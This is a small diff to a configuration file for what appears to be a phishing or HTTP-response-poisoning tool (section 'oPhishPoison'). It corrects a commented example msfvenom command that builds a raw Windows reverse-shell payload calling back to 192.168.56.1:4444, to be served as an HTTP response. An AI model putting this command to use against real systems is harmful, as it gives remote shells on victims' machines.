@@ -86,7 +86,7 @@ with the following sections.
 [oPhishPoison]
 ; This should point to the payload to be inserted as the HTTP response.
 ; For example:
-; msfvenom -p windows/reverse_tcp_shell -f raw -b '\x0d\x0a\x00\xff' -o mypayload LHOST=192.168.56.1 LPORT=4444
+; msfvenom -p windows/shell_reverse_tcp -f raw -b '\x0d\x0a\x00\xff' -o mypayload LHOST=192.168.56.1 LPORT=4444
 msfpayload   = %(home)s/tmp/my_payload
 
 ; Point to Python binary
